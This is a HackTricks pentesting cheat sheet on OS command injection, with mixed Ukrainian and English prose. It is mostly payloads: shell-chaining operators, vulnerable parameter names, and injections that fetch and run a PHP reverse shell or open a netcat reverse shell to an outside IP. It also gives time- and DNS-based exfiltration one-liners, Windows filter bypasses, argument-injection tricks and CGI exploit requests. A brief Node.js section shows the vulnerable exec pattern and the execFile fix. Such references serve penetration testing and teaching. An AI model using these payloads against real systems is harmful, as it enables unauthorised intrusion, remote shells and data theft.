# Command Injection

{{#include ../banners/hacktricks-training.md}}

## Що таке command Injection?

A **command injection** дозволяє атакуючому виконувати довільні команди операційної системи на сервері, що розміщує застосунок. Внаслідок цього застосунок та всі його дані можуть бути повністю скомпрометовані. Виконання таких команд зазвичай дозволяє атакуючому отримати несанкціонований доступ або контроль над середовищем застосунку та підлягаючою системою.

### Контекст

Залежно від **того, куди вставляється ваше введення**, можливо, доведеться **закрити контекст у лапках** (використовуючи `"` або `'`) перед командами.

## Command Injection/Execution
```bash
#Both Unix and Windows supported
ls||id; ls ||id; ls|| id; ls || id # Execute both
ls|id; ls |id; ls| id; ls | id # Execute both (using a pipe)
ls&&id; ls &&id; ls&& id; ls && id #  Execute 2º if 1º finish ok
ls&id; ls &id; ls& id; ls & id # Execute both but you can only see the output of the 2º
ls %0A id # %0A Execute both (RECOMMENDED)
ls%0abash%09-c%09"id"%0a   # (Combining new lines and tabs)

#Only unix supported
`ls` # ``
$(ls) # $()
ls; id # ; Chain commands
ls${LS_COLORS:10:1}${IFS}id # Might be useful

#Not executed but may be interesting
> /var/www/html/out.txt #Try to redirect the output to a file
< /etc/passwd #Try to send some input to the command
```
### **Обмеження** Bypasses

Якщо ви намагаєтеся виконати **arbitrary commands inside a linux machine**, вам буде цікаво прочитати про ці **Bypasses:**


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### **Приклади**
```
vuln=127.0.0.1 %0a wget https://web.es/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php
vuln=127.0.0.1%0anohup nc -e /bin/bash 51.15.192.49 80
vuln=echo PAYLOAD > /tmp/pay.txt; cat /tmp/pay.txt | base64 -d > /tmp/pay; chmod 744 /tmp/pay; /tmp/pay
```
### Параметри

Нижче — топ-25 параметрів, які можуть бути вразливими до code injection та подібних RCE vulnerabilities (з [link](https://twitter.com/trbughunters/status/1283133356922884096)):
```
?cmd={payload}
?exec={payload}
?command={payload}
?execute{payload}
?ping={payload}
?query={payload}
?jump={payload}
?code={payload}
?reg={payload}
?do={payload}
?func={payload}
?arg={payload}
?option={payload}
?load={payload}
?process={payload}
?step={payload}
?read={payload}
?function={payload}
?req={payload}
?feature={payload}
?exe={payload}
?module={payload}
?payload={payload}
?run={payload}
?print={payload}
```
### Time based data exfiltration

Extracting data: char by char
```
swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == s ]; then sleep 5; fi
real    0m5.007s
user    0m0.000s
sys 0m0.000s

swissky@crashlab▸ ~ ▸ $ time if [ $(whoami|cut -c 1) == a ]; then sleep 5; fi
real    0m0.002s
user    0m0.000s
sys 0m0.000s
```
### DNS based data exfiltration

На основі інструмента з `https://github.com/HoLyVieR/dnsbin`, також розміщеного на dnsbin.zhack.ca
```
1. Go to http://dnsbin.zhack.ca/
2. Execute a simple 'ls'
for i in $(ls /) ; do host "$i.3a43c7e4e57a8d0e2057.d.zhack.ca"; done
```

```
$(host $(wget -h|head -n1|sed 's/[ ,]/-/g'|tr -d '.').sudo.co.il)
```
Онлайн інструменти для перевірки DNS based data exfiltration:

- dnsbin.zhack.ca
- pingb.in

### Filtering bypass

#### Windows
```
powershell C:**2\n??e*d.*? # notepad
@^p^o^w^e^r^shell c:**32\c*?c.e?e # calc
```
#### Linux


{{#ref}}
../linux-hardening/bypass-bash-restrictions/
{{#endref}}

### Node.js `child_process.exec` vs `execFile`

Під час аудиту серверної частини на JavaScript/TypeScript ви часто зустрінете Node.js `child_process` API.
```javascript
// Vulnerable: user-controlled variables interpolated inside a template string
const { exec } = require('child_process');
exec(`/usr/bin/do-something --id_user ${id_user} --payload '${JSON.stringify(payload)}'`, (err, stdout) => {
/* … */
});
```
`exec()` запускає **shell** (`/bin/sh -c`), тому будь-який символ, що має спеціальне значення для shell (back-ticks, `;`, `&&`, `|`, `$()`, …) призведе до **command injection**, коли введення користувача конкатенується в рядок.

Запобігання: використовуйте `execFile()` (або `spawn()` без опції `shell`) і передавайте **кожен аргумент як окремий елемент масиву**, щоб shell не використовувався:
```javascript
const { execFile } = require('child_process');
execFile('/usr/bin/do-something', [
'--id_user', id_user,
'--payload', JSON.stringify(payload)
]);
```
Real-world case: *Synology Photos* ≤ 1.7.0-0794 was exploitable through an unauthenticated WebSocket event that placed attacker controlled data into `id_user` which was later embedded in an `exec()` call, achieving RCE (Pwn2Own Ireland 2024).

### Ін'єкція аргументів/опцій через ведучий дефіс (argv, no shell metacharacters)

Не всі ін'єкції потребують shell metacharacters. Якщо застосунок передає неперевірені рядки як аргументи в системну утиліту (навіть через `execve`/`execFile` і без shell), багато програм все одно розбиратимуть будь-який аргумент, що починається з `-` або `--`, як опцію. Це дозволяє атакуючому змінювати режими, змінювати шляхи виводу або викликати небезпечну поведінку, навіть не потрапляючи в shell.

Типові місця, де це зустрічається:

- Вбудовані web UIs/CGI handlers, які формують команди на кшталт `ping <user>`, `tcpdump -i <iface> -w <file>`, `curl <url>`, тощо.
- Централізовані CGI маршрутизатори (наприклад, `/cgi-bin/<something>.cgi` з параметром-селектором типу `topicurl=<handler>`), де кілька handler-ів використовують той самий слабкий валідатор.

Що спробувати:

- Передавайте значення, що починаються з `-`/`--`, щоб утиліта, яка виконується, сприйняла їх як опції.
- Зловживайте опціями, що змінюють поведінку або записують файли, наприклад:
- `ping`: `-f`/`-c 100000` щоб навантажити пристрій (DoS)
- `curl`: `-o /tmp/x` щоб записати довільні шляхи, `-K <url>` щоб завантажити attacker-controlled конфігурацію
- `tcpdump`: `-G 1 -W 1 -z /path/script.sh` щоб досягти виконання після ротації в небезпечних обгортках
- Якщо програма підтримує `--` як кінець опцій, спробуйте обійти наївні пом'якшення, які додають `--` не в тому місці.

Generic PoC shapes against centralized CGI dispatchers:
```
POST /cgi-bin/cstecgi.cgi HTTP/1.1
Content-Type: application/x-www-form-urlencoded

# Flip options in a downstream tool via argv injection
topicurl=<handler>&param=-n

# Unauthenticated RCE when a handler concatenates into a shell
topicurl=setEasyMeshAgentCfg&agentName=;id;
```
## Список виявлення Brute-Force


{{#ref}}
https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/command_injection.txt
{{#endref}}

## Посилання

- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Command%20Injection)
- [https://portswigger.net/web-security/os-command-injection](https://portswigger.net/web-security/os-command-injection)
- [Extraction of Synology encrypted archives – Synacktiv 2025](https://www.synacktiv.com/publications/extraction-des-archives-chiffrees-synology-pwn2own-irlande-2024.html)
- [PHP proc_open manual](https://www.php.net/manual/en/function.proc-open.php)
- [HTB Nocturnal: IDOR → Command Injection → Root via ISPConfig (CVE‑2023‑46818)](https://0xdf.gitlab.io/2025/08/16/htb-nocturnal.html)
- [Unit 42 – TOTOLINK X6000R: Three New Vulnerabilities Uncovered](https://unit42.paloaltonetworks.com/totolink-x6000r-vulnerabilities/)

{{#include ../banners/hacktricks-training.md}}
